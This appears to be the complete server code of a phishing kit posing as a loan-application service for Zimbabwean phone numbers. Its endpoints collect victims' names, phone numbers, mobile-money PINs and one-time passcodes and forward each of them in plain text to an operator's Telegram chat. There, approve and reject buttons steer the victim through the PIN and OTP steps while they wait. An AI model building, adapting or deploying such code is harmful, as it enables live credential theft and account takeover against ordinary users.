require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files from frontend
const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

// Explicitly serve style.css with correct MIME type
app.get('/style.css', (req, res) => {
  res.sendFile(path.join(frontendPath, 'style.css'), {
    headers: { 'Content-Type': 'text/css' }
  });
});

// Config
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// In-memory store
const applications = {};
const approvalStates = {};

// Telegram helper
async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// API routes

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Send application
app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  const appId = `${data.phone}_${Date.now()}`;
  applications[appId] = {
    ...data,
    pinStatus: 'pending',
    otpStatus: 'pending',
    createdAt: new Date().toISOString()
  };

  const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${appId}\n📱 Phone: +263${data.phone}\n💰 Amount: $${data.loanAmount}\n📅 Duration: ${data.loanDuration} days\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId: appId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId: appId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, applicationId: appId, status: 'waiting_pin' });
});

// Send PIN
app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
  applications[applicationId].pin = pin;
  applications[applicationId].pinStatus = 'pending';

  const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'waiting_admin' });
});

// Send OTP
app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
  applications[applicationId].otp = otp;
  applications[applicationId].otpStatus = 'pending';

  const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'waiting_admin' });
});

// Resend OTP
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
  applications[applicationId].otpStatus = 'pending';

  const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📌 New OTP requested.\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'otp_resent' });
});

// Status check
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
  let status = 'pending';
  if (req.params.step === 'pin') status = app.pinStatus;
  else if (req.params.step === 'otp') status = app.otpStatus;
  res.json({ ok: true, status });
});

// Telegram Webhook
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const query = update.callback_query;
    const { action, step, applicationId } = JSON.parse(query.data);
    const app = applications[applicationId];
    if (!app) return res.sendStatus(200);

    if (step === 'PIN') app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
    else if (step === 'OTP') app.otpStatus = action === 'YES' ? 'approved' : 'rejected';

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${action}` })
    });

    await sendTelegramMessage(`📌 *Status Update*\n🆔 ID: ${applicationId}\n📋 ${step}: ${action}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`📊 Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = '📋 Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phone} (${app.pinStatus})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      } else if (text === '/status') {
        const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
        await sendTelegramMessage(`Webhook: ${webhookInfo.result?.url || 'not set'}`);
      }
    }
  }

  res.sendStatus(200);
});

// Fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
